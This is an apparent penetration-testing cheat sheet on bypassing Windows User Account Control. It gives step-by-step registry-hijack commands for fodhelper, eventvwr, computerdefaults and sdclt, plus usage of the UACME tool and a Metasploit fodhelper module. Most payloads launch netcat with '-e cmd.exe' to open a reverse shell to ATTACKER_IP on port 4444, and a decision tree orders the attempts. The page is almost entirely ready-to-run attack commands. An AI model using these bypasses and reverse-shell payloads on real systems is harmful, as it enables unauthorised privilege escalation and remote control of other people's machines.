---
title: 'UAC Bypass'
description: 'User Account Control (UAC) bypass techniques for Windows privilege escalation — fodhelper, eventvwr, UACME, and more.'
---

# UAC Bypass

## When You Need a UAC Bypass

You are in the **Administrators** group but running at **Medium Integrity Level** (filtered admin token). You need to elevate to **High Integrity** without triggering the UAC consent prompt.

```cmd
:: Check if UAC bypass is needed
whoami /groups | findstr /i "Medium Mandatory"
:: If you see "Medium Mandatory Level" AND you're in Administrators → bypass UAC

:: Verify you're actually an admin
net localgroup Administrators | findstr %username%
```

### UAC Integrity Flow

```
Administrator Login
       │
       ├── Filtered Token (Medium IL) ← Your shell is here
       │     └── Standard apps, cmd, PowerShell
       │
       └── Elevated Token (High IL) ← You want to get here
             └── Admin tasks, service management, etc.
```

---

## UAC Registry Settings

Check these to understand the UAC configuration:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken
```

| `ConsentPromptBehaviorAdmin` Value | Meaning |
|:----------------------------------|:--------|
| `0` | No prompt (auto-elevate) — easiest to bypass |
| `1` | Prompt for credentials on Secure Desktop |
| `2` | Prompt for consent on Secure Desktop (default) |
| `5` | Prompt for consent (not on Secure Desktop) |

!!! tip "Built-in Administrator (RID 500)"
    The built-in Administrator account (RID 500) runs with **High Integrity by default** and doesn't get UAC filtering — unless `FilterAdministratorToken` is set to `1`.

---

## Bypass 1: fodhelper.exe (Best — No Disk Write)

`fodhelper.exe` is a Microsoft-signed binary that auto-elevates and checks a registry key for commands to execute.

```cmd
:: Step 1: Set payload in registry
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd /c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f

:: Step 2: Trigger fodhelper (auto-elevates, reads our registry key, executes our command at High IL)
fodhelper.exe

:: Step 3: Clean up
reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /f
```

**Works on**: Windows 10, Windows 11, Server 2016+

---

## Bypass 2: eventvwr.exe

Similar concept — Event Viewer auto-elevates and loads a handler from `HKCU`.

```cmd
:: Set payload
reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "cmd /c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" /f

:: Trigger
eventvwr.exe

:: Clean up
reg delete HKCU\Software\Classes\mscfile /f
```

**Works on**: Windows 10 (older builds), Windows 7/8

---

## Bypass 3: computerdefaults.exe

```cmd
:: Set payload
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd /c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f

:: Trigger
computerdefaults.exe

:: Clean up
reg delete "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f
```

---

## Bypass 4: sdclt.exe (System Restore)

```cmd
:: Set payload
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd /c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v DelegateExecute /t REG_SZ /f

:: Trigger
sdclt.exe

:: Clean up
reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f
```

---

## Bypass 5: UACME (70+ Methods)

Comprehensive UAC bypass tool with 70+ techniques.

**Repo**: [github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

```cmd
:: Syntax: Akagi64.exe [method_number] [command]
Akagi64.exe 23 cmd.exe
Akagi64.exe 61 C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe
```

### Commonly Used UACME Methods

| Method # | Technique | Target |
|:---------|:---------|:-------|
| 23 | pkgmgr.exe + DISM | Windows 10 |
| 33 | fodhelper.exe | Windows 10 |
| 34 | slui.exe | Windows 10 |
| 41 | computerdefaults.exe | Windows 10 |
| 61 | msconfig.exe | Windows 10/11 |

---

## Bypass 6: Meterpreter

```
meterpreter> getuid         :: Shows current user
meterpreter> getsystem      :: Attempts token impersonation
meterpreter> background

:: If getsystem fails, use UAC bypass module
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
set LHOST ATTACKER_IP
run
```

---

## Quick Decision Tree

```
Is UAC needed?
  │
  ├── whoami /groups → "Medium Mandatory Level" + in Administrators?
  │     │
  │     ├── YES → Try fodhelper first (most reliable)
  │     │            │
  │     │            ├── Success → You now have High IL shell
  │     │            │
  │     │            └── Fail → Try eventvwr, computerdefaults, sdclt
  │     │                        │
  │     │                        └── All fail → Use UACME
  │     │
  │     └── NO (already High IL) → UAC bypass not needed
  │
  └── Not in Administrators group → UAC bypass won't help
        (need different privesc vector)
```
